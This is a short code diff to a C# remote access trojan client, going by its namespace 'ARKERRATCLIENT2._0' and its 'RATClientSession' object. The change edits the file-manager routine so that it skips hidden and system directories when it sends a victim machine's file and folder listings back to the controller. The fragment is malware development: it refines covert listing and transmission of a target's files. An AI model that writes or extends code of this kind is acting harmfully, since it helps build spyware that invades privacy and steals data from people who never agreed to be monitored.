@@ -23,7 +23,13 @@ namespace ARKERRATCLIENT2._0
             }
             else
             {
-                await RATClientSession.SendData("§FileManagerStart§" + string.Join(",", Directory.GetFiles(path))+"|"+string.Join(",", Directory.GetDirectories(path)) +"§FileManagerEnd§");
+                var directories = Directory.GetDirectories(path).Where(directory =>
+                {
+                    var directoryInfo = new DirectoryInfo(directory);
+                    return (directoryInfo.Attributes & FileAttributes.Hidden) == 0 && (directoryInfo.Attributes & FileAttributes.System) == 0;
+                }).ToArray();
+
+                await RATClientSession.SendData("§FileManagerStart§" + string.Join(",", Directory.GetFiles(path))+"|"+string.Join(",", directories) +"§FileManagerEnd§");
             }
         }
 
